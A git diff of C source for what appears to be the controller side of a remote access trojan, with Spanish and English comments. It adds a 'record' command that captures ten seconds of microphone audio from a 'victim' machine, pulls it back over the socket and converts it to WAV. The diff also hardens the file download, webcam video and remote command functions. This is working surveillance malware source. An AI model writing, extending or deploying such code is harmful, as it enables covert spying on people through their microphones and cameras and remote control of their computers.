@@ -14,11 +14,11 @@
 #include <fcntl.h>
 #include "../src/base64.c"
 
-// Eliminar los .ppm del cliente..
-// API de ALSA para acceder al micrófono y la API de Video4Linux para acceder a la cámara.
+//Funcio upload/download video/audio funcionando correctamente
 
-int serverSock;
-int targetConn;
+// Variables globales
+int serverSock, targetConn;
+int countAudio, countVideo = 0;
 
 // Definiciones
 #define SOCKBUFFER 2048
@@ -86,8 +86,11 @@ void closeConection(int targetConn, char *command, size_t instructLen, char *cli
 void checkStart(char *IPAddress){
     char formed[SOCKBUFFER];
     char formed1[SOCKBUFFER];
+    char formed2[SOCKBUFFER];
+    char formed3[SOCKBUFFER];
     snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
     snprintf(formed1, SOCKBUFFER, "./DATA/%s/video", IPAddress);
+    snprintf(formed2, SOCKBUFFER, "./DATA/%s/audio", IPAddress);
     struct stat buffer;
     if (stat("./DATA", &buffer) != 0) {
         mkdir("./DATA", 0700); 
@@ -97,6 +100,12 @@ void checkStart(char *IPAddress){
     }
     if (stat(formed1, &buffer) != 0){
         mkdir(formed1, 0700);   
+    }
+    if (stat(formed2, &buffer) != 0){
+        mkdir(formed2, 0700);   
+    }
+    if (stat(formed3, &buffer) != 0){
+        mkdir(formed3, 0700);   
     }
     
    
@@ -123,6 +132,8 @@ void helpPannel(){
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] video                 -> Take a 10s video (1280x720p)\n");
     printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] record                -> Take a 10s audio record\n");
+    printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q / exit              -> Exit the conection\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
@@ -145,6 +156,11 @@ int readSendFile(int targetConn, char *filename, char *instruct){
         send(targetConn, "end\0", strlen("end\0"), 0);
         return 1;
     }
+
+    sleep(0.4);
+    char bytesStr[100]; memset(bytesStr, 0, 100);
+    snprintf(bytesStr, SOCKBUFFER, "%ld", fullBytes);
+    send(targetConn, bytesStr, 100, 0);
 
     FILE *fp;
     fp = fopen(filename, "rb");
@@ -169,8 +185,10 @@ int readSendFile(int targetConn, char *filename, char *instruct){
 
     printf("\n");
     fclose(fp);
-    sleep(0.3);
-    send(targetConn, "end\0", strlen("end\0"), 0); 
+
+    //sleep(0.3);
+    //send(targetConn, "end\0", strlen("end\0"), 0); 
+
     printf("\n\t%s[*>] %sFile Uploaded Successfully.\n\n", YELLOW, BLUE);
     return 0;
 
@@ -184,7 +202,8 @@ int sndAndExecCmd(int targetConn, char *command){
     
     while (true) {
         recv(targetConn, resp, SOCKBUFFER, 0);
-        if (strcmp(resp, "end\0") == 0){
+        if (strstr(resp, "end\0") != NULL){
+            printf("%s\n", resp);
             break;
             
         } else {
@@ -255,8 +274,10 @@ int downloadFunc(char *command, int targetConn, char *ip){
 
     // Tamaño máximo del archivo 
     char bytesStr[100];
+    memset(bytesStr, 0, 100);
+
     recv(targetConn, bytesStr, 100, 0);
-    long fullBytes;
+    long fullBytes = 0;
     fullBytes = atoi(bytesStr);
 
     if (fullBytes == -1){
@@ -278,15 +299,15 @@ int downloadFunc(char *command, int targetConn, char *ip){
     size_t bytesRead = 0;
 
 
-    while (true){
+    while (fullBytes > bytesRead){
         bytesReadCurrent = recv(targetConn, (char *)recvData, SOCKBUFFER, 0);
         
-        if (bytesReadCurrent < 2000){
-            printf("\n%d", bytesReadCurrent);
-            fwrite(recvData, 1, bytesReadCurrent, fp);
-            memset(recvData, 0, SOCKBUFFER);            
-            break;
-        }
+        //if (bytesReadCurrent < 2000){
+        //    printf("\n%d", bytesReadCurrent);
+        //    fwrite(recvData, 1, bytesReadCurrent, fp);
+        //    memset(recvData, 0, SOCKBUFFER);            
+        //    break;
+        //}
         
         fwrite(recvData, 1, bytesReadCurrent, fp);
         bytesRead += bytesReadCurrent;
@@ -296,6 +317,7 @@ int downloadFunc(char *command, int targetConn, char *ip){
     }
 
     fclose(fp);
+    printf("\n");
 
 }
 
@@ -428,20 +450,20 @@ int recvVideoData(char *command, int targetConn, char *clientIP) {
     printf("\n\t%s[*>] %sReciving Compressed File...%s [%.2f MB]\n\n", RED, YELLOW, end, megabytes); 
 
     long recvBytes = 0;
+    int rcBytes;
 
-    while (true){
-        int rcBytes = recv(targetConn, recvData, SOCKBUFFER, 0); 
+    while (fullBytes > recvBytes){
+        rcBytes = recv(targetConn, recvData, SOCKBUFFER, 0); 
         long size = rcBytes;
-        fflush(stdout); 
-        //printf("Reciving: %s\r", recvData);
+        fflush(stdout);  
 
-        if (strcmp(recvData, "ending\0") == 0){  
-            fflush(stdout);
-            break;
-        }
+        //if (strcmp(recvData, "ending\0") == 0 || rcBytes <= 0){  
+        //    fflush(stdout);
+        //    break;
+        //}
 
-        else
-            fwrite(recvData, 1, rcBytes, fp);
+        //else
+        fwrite(recvData, 1, rcBytes, fp);
             //fprintf(fp, "%s", base64_decode(recvData, size, &size));
                 
         recvBytes = recvBytes + rcBytes;
@@ -449,7 +471,6 @@ int recvVideoData(char *command, int targetConn, char *clientIP) {
         memset(recvData, 0, 2048);
 
     }
-    printf("\n");
     memset(formed, 0, SOCKBUFFER);
     fclose(fp); 
 
@@ -460,13 +481,56 @@ int recvVideoData(char *command, int targetConn, char *clientIP) {
     memset(formed, 0, SOCKBUFFER);
     
     // Montamo video a partirde .ppm
-    snprintf(formed, SOCKBUFFER, "ffmpeg -y -framerate 24 -i ./DATA/%s/video/tmp/out%%03d.ppm -c:v libx264 -crf 25 -vf 'scale=1280:720,format=yuv420p' -movflags +faststart ./DATA/%s/video/recVideo.mp4", clientIP, clientIP);
+    snprintf(formed, SOCKBUFFER, "ffmpeg -y -framerate 24 -i ./DATA/%s/video/tmp/out%%03d.ppm -c:v libx264 -crf 25 -vf 'scale=1280:720,format=yuv420p' -movflags +faststart ./DATA/%s/video/recorded-video-%d.mp4", clientIP, clientIP, countVideo);
     system(formed);
     
     printf("\n\n%s[*>] %sVideo mounted and recived succsessfully %s[./DATA/%s/video/] %s\n", YELLOW, RED, YELLOW, clientIP, end);
+    countVideo++;
     return 0; 
 }
 
+int recvAudioData(char *command, int targetConn, char *clientIP){
+    printf("\n%s[*>] %sRecording 10s of audio%s\n", BLUE, YELLOW, end);
+    send(targetConn, command, strlen(command), 0);
+    
+    char fullBytesStr[100];
+    memset(fullBytesStr, 0, 100);
+    recv(targetConn, fullBytesStr, 100, 0);
+
+    if (strcmp("error", fullBytesStr) == 0){
+        printf("%s[!>] %sAn error has ocurred...%s", RED, YELLOW, end); 
+        return 1;       
+    }
+
+    long fullBytes = atoi(fullBytesStr);
+
+    char formed[SOCKBUFFER];
+    snprintf(formed, SOCKBUFFER, "./DATA/%s/audio/raw/raw-audio-%d.raw", clientIP, countAudio);
+    
+    FILE *fp = fopen(formed, "wb");
+    char recvData[SOCKBUFFER];
+
+    long bytesReadFull = 0;
+    long bytesRead = 0;
+
+    while (fullBytes > bytesReadFull){
+        bytesRead = recv(targetConn, recvData, 2048, 0);
+
+        fwrite(recvData, 1, bytesRead, fp);
+        memset(recvData, 0, SOCKBUFFER);
+        bytesReadFull += bytesRead;
+        printProgressBar(bytesReadFull, bytesReadFull);
+    }
+
+    fclose(fp);
+
+    char cmd[SOCKBUFFER];
+    snprintf(cmd, SOCKBUFFER, "sox -r 44100 -e signed -b 32 -c 1 %s ./DATA/%s/audio/recorded-audio-%d.wav", formed, clientIP, countAudio);
+    system(cmd);
+    printf("\n\n%s[*>] %sRaw Audio recived and processed succsessfully %s ./DATA/%s/audio/recorded-audio-%d.wav %s\n", RED, YELLOW, BLUE, clientIP, countAudio, end);
+    countAudio++;
+    return 1;
+}
 
 int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
     char command[255] = "";
@@ -522,6 +586,9 @@ int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
 
             else if (strcmp(command, "video") == 0)
                 recvVideoData(command, targetConn, clientIP);
+            
+            else if(strcmp(command, "record") == 0)
+                recvAudioData(command, targetConn, clientIP);
 
             else
                 printf("\n\t%s[!>]%s Instruct Not Known...\n", RED, YELLOW);
